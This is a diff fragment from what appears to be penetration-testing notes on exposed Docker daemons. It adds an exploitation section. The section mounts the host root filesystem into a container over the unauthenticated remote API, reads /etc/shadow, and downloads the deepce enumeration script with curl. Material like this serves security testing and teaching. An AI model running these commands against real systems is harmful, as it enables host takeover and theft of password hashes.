@@ -72,5 +72,20 @@ docker -H tcp://target.com:2375 info
 
 docker -H tcp://target.com:2375 system df 
 
+```
+**Exploitation** 
 
+```
+docker -H tcp://target.com:2375 run -it \
+  -v /:/hostfs ubuntu /bin/bash # Volume mounting allows containers to access host filesystems, potentially leading to host compromise when sensitive directories are mounted.
+
+```
+
+```
+cd /hostfs
+cat /hostfs/etc/shadow
+```
+
+```
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
 ```
